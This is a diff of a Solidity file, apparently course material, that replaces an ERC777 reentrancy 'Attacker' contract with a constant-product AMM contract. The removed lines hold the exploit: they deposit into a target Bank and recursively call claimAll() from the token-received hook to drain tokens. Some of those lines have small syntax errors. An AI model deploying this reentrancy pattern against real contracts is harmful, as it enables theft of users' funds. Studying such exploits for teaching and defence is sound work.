@@ -1,80 +1,95 @@
-
+// SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.17;
 
 import "@openzeppelin/contracts/access/AccessControl.sol";
-import "@openzeppelin/contracts/token/ERC777/ERC777.sol";
-import "@openzeppelin/contracts/token/ERC777/IERC777Recipient.sol";
-import "@openzeppelin/contracts/interfaces/IERC1820Registry.sol";
-import "./Bank.sol";
+import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
 
-contract Attacker is AccessControl, IERC777Recipient {
-    bytes32 public constant ATTACKER_ROLE = keccak256("ATTACKER_ROLE");
-	IERC1820Registry private _erc1820 = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24); //This is the location of the EIP1820 registry
-	bytes32 constant private TOKENS_RECIPIENT_INTERFACE_HASH = keccak256("ERC777TokensRecipient"); //When someone tries to send an ERC777 contract, they check if the recipient implements this interface
-	uint8 depth = 0;
-	uint8 max_depth = 2;
+contract AMM is AccessControl {
+    bytes32 public constant LP_ROLE = keccak256("LP_ROLE");
+    uint256 public invariant;
+    address public tokenA;
+    address public tokenB;
+    uint256 feebps = 3; // Fee in basis points
 
-	Bank public bank; 
+    event Swap(address indexed _inToken, address indexed _outToken, uint256 inAmt, uint256 outAmt);
+    event LiquidityProvision(address indexed _from, uint256 AQty, uint256 BQty);
+    event Withdrawal(address indexed _from, address indexed recipient, uint256 AQty, uint256 BQty);
 
-	event Deposit(uint256 amount );
-	event Recurse(uint8 depth);
+    constructor(address _tokenA, address _tokenB) {
+        _grantRole(DEFAULT_ADMIN_ROLE, msg.sender);
+        _grantRole(LP_ROLE, msg.sender);
 
-    constructor(address admin) {
-        _grantRole(DEFAULT_ADMIN_ROLE, admin);
-        _grantRole(ATTACKER_ROLE, admin);
-		_erc1820.setInterfaceImplementer(address(this),TOKENS_RECIPIENT_INTERFACE_HASH,address(this)); //In order to receive ERC777 (like the MCITR tokens used in the attack) you must register with the EIP1820 Registry
+        require(_tokenA != address(0), "Token address cannot be 0");
+        require(_tokenB != address(0), "Token address cannot be 0");
+        require(_tokenA != _tokenB, "Tokens cannot be the same");
+
+        tokenA = _tokenA;
+        tokenB = _tokenB;
     }
 
-	function setTarget(address bank_address) external onlyRole(ATTACKER_ROLE) {
-		bank = Bank(bank_address);
-        _grantRole(ATTACKER_ROLE, address(this));
-        _grantRole(ATTACKER_ROLE, bank.token.address );
-	}
+    function tradeTokens(address sellToken, uint256 sellAmount) public {
+        require(invariant > 0, "Invariant must be nonzero");
+        require(sellToken == tokenA || sellToken == tokenB, "Invalid token");
+        require(sellAmount > 0, "Cannot trade 0");
 
-	/*
-	   The main attack function that should start the reentrancy attack
-	   amt is the amt of ETH the attacker will deposit initially to start the attack
-	*/
-	function attack(uint256 amt) payable public {
-      require( address(bank) != address(0), "Target bank not set" );
-			require(msg.value == amt, "Incorrect ETH sent");
+        uint256 qtyA = ERC20(tokenA).balanceOf(address(this));
+        uint256 qtyB = ERC20(tokenB).balanceOf(address(this));
+        uint256 swapAmt;
+        uint256 new_invariant;
 
-      //deposit ETH into Bank contract
-      bank.deposit{value: amt}();
+        if (sellToken == tokenA) {
+            uint256 feeAdjustedAmountA = (sellAmount * (10000 - feebps)) / 10000;
+            uint256 newQtyA = qtyA + feeAdjustedAmountA;
+            require(newQtyA > 0, "Overflow on tokenA");
 
-      //Initiate withdrawal to start the reentrancy attack
-      bank.claimAll();
-    }
-	}
+            swapAmt = qtyB - (invariant / newQtyA);
+            require(swapAmt > 0 && swapAmt < qtyB, "Insufficient liquidity");
 
-	/*
-	   After the attack, this contract has a lot of (stolen) MCITR tokens
-	   This function sends those tokens to the target recipient
-	*/
-	function withdraw(address recipient) public onlyRole(ATTACKER_ROLE) {
-		ERC777 token = bank.token();
-		token.send(recipient,token.balanceOf(address(this)),"");
-	}
+            ERC20(tokenA).transferFrom(msg.sender, address(this), sellAmount);
+            ERC20(tokenB).transfer(msg.sender, swapAmt);
+        } else {
+            uint256 feeAdjustedAmountB = (sellAmount * (10000 - feebps)) / 10000;
+            uint256 newQtyB = qtyB + feeAdjustedAmountB;
+            require(newQtyB > 0, "Overflow on tokenB");
 
-	/*
-	   This is the function that gets called when the Bank contract sends MCITR tokens
-	*/
-	function tokensReceived(
-		address operator,
-		address from,
-		address to,
-		uint256 amount,
-		bytes calldata userData,
-		bytes calldata operatorData
-	) external {
-        //recurse the attack if less than depth
-        if (depth < max_depth) {
-            depth++;
-            emit Recurse(depth);
+            swapAmt = qtyA - (invariant / newQtyB);
+            require(swapAmt > 0 && swapAmt < qtyA, "Insufficient liquidity");
 
-            //call claimAll() to withdraw more tokens and trigger reentrancy again
-            bank.claimAll();
+            ERC20(tokenB).transferFrom(msg.sender, address(this), sellAmount);
+            ERC20(tokenA).transfer(msg.sender, swapAmt);
         }
 
-}
+        new_invariant = ERC20(tokenA).balanceOf(address(this)) * ERC20(tokenB).balanceOf(address(this));
+        require(new_invariant >= invariant, "Bad trade");
+        invariant = new_invariant;
 
+        emit Swap(sellToken, sellToken == tokenA ? tokenB : tokenA, sellAmount, swapAmt);
+    }
+
+    function provideLiquidity(uint256 amtA, uint256 amtB) public {
+        require(amtA > 0 || amtB > 0, "Cannot provide 0 liquidity");
+
+        ERC20(tokenA).transferFrom(msg.sender, address(this), amtA);
+        ERC20(tokenB).transferFrom(msg.sender, address(this), amtB);
+
+        invariant = ERC20(tokenA).balanceOf(address(this)) * ERC20(tokenB).balanceOf(address(this));
+
+        emit LiquidityProvision(msg.sender, amtA, amtB);
+    }
+
+    function withdrawLiquidity(address recipient, uint256 amtA, uint256 amtB) public onlyRole(LP_ROLE) {
+        require(amtA > 0 || amtB > 0, "Cannot withdraw 0");
+        require(recipient != address(0), "Cannot withdraw to 0 address");
+
+        if (amtA > 0) {
+            ERC20(tokenA).transfer(recipient, amtA);
+        }
+        if (amtB > 0) {
+            ERC20(tokenB).transfer(recipient, amtB);
+        }
+
+        invariant = ERC20(tokenA).balanceOf(address(this)) * ERC20(tokenB).balanceOf(address(this));
+
+        emit Withdrawal(msg.sender, recipient, amtA, amtB);
+    }
+}
